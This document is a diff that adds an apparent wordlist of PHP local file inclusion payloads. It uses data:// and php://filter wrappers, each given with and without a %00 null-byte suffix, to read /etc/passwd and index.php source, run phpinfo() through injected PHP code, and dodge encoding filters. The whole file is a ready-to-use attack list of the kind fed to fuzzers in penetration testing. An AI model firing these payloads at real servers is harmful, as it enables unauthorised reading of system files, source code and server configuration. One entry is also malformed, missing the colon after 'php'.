@@ -1,0 +1,26 @@
+data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
+data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>%00
+data://text/plain,<?php phpinfo(); ?>
+data://text/plain,<?php phpinfo(); ?>%00
+php //filter/convert.base64-encode/resource=/etc/passwd
+php //filter/convert.base64-encode/resource=/etc/passwd%00
+php://fd/3
+php://fd/3%00
+php://filter/convert.base64-decode/resource=data://plain/text,SEFDS0VSIEhBQ0tFUg==
+php://filter/convert.base64-decode/resource=data://plain/text,SEFDS0VSIEhBQ0tFUg==%00
+php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd
+php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd%00
+php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=
+php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=%00
+php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=
+php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=%00
+php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd
+php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd%00
+php://filter/string.strip_tags/resource=data://text/plain,<h1>HACKER</h1>
+php://filter/string.strip_tags/resource=data://text/plain,<h1>HACKER</h1>%00
+php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd
+php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd%00
+php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd
+php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd%00
+php://filter/zlib.inflate/resource=test.deflated
+php://filter/zlib.inflate/resource=test.deflated%00
